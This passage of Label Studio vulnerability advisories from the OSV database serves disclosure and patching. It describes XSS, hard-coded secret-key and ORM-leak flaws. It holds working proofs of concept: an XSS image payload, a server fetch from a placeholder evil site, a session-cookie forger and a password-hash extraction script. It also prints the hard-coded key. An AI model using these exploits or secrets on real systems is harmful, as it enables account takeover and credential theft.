DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  